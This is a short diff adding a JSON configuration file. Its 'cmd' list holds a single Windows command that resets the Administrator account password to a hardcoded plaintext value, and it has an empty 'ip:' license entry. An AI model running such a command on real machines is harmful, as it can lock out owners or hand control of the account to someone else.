@@ -1,0 +1,8 @@
+{
+     "cmd": [
+         "net user Administrator MaximBoner123"
+     ],
+     "licenses": [
+         "ip:"
+     ]
+}
